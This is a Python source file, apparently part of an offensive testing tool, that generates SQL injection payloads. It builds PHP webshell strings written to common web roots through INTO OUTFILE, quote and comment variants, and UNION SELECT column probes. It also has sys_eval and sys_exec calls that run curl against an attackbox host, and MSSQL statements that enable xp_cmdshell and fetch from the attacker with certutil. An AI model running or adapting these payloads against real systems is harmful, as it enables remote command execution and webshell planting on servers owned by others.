PHP_SHELL_CITATION = '<?php system(' + '$_GET["cmd"]' + '); ?>'
PHP_SHELL_PING = "<?php system(" + "$_GET['cmd']" + "); ?>"

# TODO: Expand with ASP, ASPX, and JSP webshells as well

SQLMAP_WEBROOTS = {
    "WINDOWS": ("", "C:/xampp/htdocs", "C:/wamp/www", "C:/Inetpub/wwwroot"),
    "LINUX": ("", "/var/www", "/var/www/html", "/var/www/htdocs", "/usr/local/apache2/htdocs", "/usr/local/www/data", "/var/apache2/htdocs", "/var/www/nginx-default", "/srv/www/htdocs", "/usr/local/var/www", "/usr/share/nginx/html")
}

def sqli_prefix(args):
    return [
        b"",
        b"' ", b"%' ", b"') ", b"')) ", b"%') ", b"%')) ",
        b'" ', b'%" ', b'") ', b'")) ', b'%") ', b'%")) '
    ]

def sqli_suffix(args):
    return [
        b"", b"-- ", b"--- ", b"# ", b"// ", b"-- // ", b"--- // ", b"# // "
    ]

def sqli_union_cols():
    all_cols = [chr(97 + i) for i in range(16)]
    for i in range(1, len(all_cols)):
        yield all_cols[:i]

# TODO: Try to make PHP misbehave by sending different data types
def sqli_union(args): # Assumes known prefix and suffix
    for cols in sqli_union_cols():
        yield b"UNION SELECT '" + "', '".join(cols).encode() + b"'"
        yield b'UNION SELECT "' + '", "'.join(cols).encode() + b'"'

def sqli_execute_all(args, os, url_request_cmd): # Assumes known prefix and suffix
    select_payloads = [
        ('', f'sys_eval("{url_request_cmd} http://{args.attackbox_ip}:{args.attackbox_web_port}/callback_sys_exec")', ''),
        ('', f"sys_eval('{url_request_cmd} http://{args.attackbox_ip}:{args.attackbox_web_port}/callback_sys_exec')", ''),
        ('', f'sys_exec("{url_request_cmd} http://{args.attackbox_ip}:{args.attackbox_web_port}/callback_sys_exec")', ''),
        ('', f"sys_exec('{url_request_cmd} http://{args.attackbox_ip}:{args.attackbox_web_port}/callback_sys_exec')", ''),
    ]

    for root in SQLMAP_WEBROOTS[os]:
        abs_file = f"{root}/shell.php"
        select_payloads.append(("'", PHP_SHELL_CITATION, f" INTO OUTFILE '{abs_file}'"))
        select_payloads.append(('"', PHP_SHELL_PING, f' INTO OUTFILE "{abs_file}"'))

    for quote_sign, value, suffix in select_payloads:
        yield f"SELECT {quote_sign}{value}{quote_sign}{suffix}".encode()

        for cols in sqli_union_cols():
            cols[0] = value
            yield f"UNION SELECT {quote_sign}{f'{quote_sign}, {quote_sign}'.join(cols)}{quote_sign}{suffix}".encode()

def sqli_execute_linux(args): # Assumes known prefix and suffix
    yield from sqli_execute_all(args, "LINUX", "curl")

def sqli_execute_windows(args):
    command = "certutil.exe -urlcache -f"
    full_command = f"{command} http://{args.attackbox_ip}:{args.attackbox_web_port}/callback_xp_cmdshell"

    yield from sqli_execute_all(args, "WINDOWS", command)

    for quote_sign in ["'", '"']:
        yield f"EXECUTE sp_configure {quote_sign}show advanced options{quote_sign}, 1; RECONFIGURE; EXECUTE sp_configure {quote_sign}xp_cmdshell{quote_sign}, 1; RECONFIGURE; EXECUTE xp_cmdshell {quote_sign}{full_command}{quote_sign}".encode()
        yield f"EXECUTE sp_configure {quote_sign}show advanced options{quote_sign}, 1; RECONFIGURE; EXECUTE sp_configure {quote_sign}xp_cmdshell{quote_sign}, 1; RECONFIGURE".encode()
        yield f"EXECUTE xp_cmdshell {quote_sign}{full_command}{quote_sign}".encode()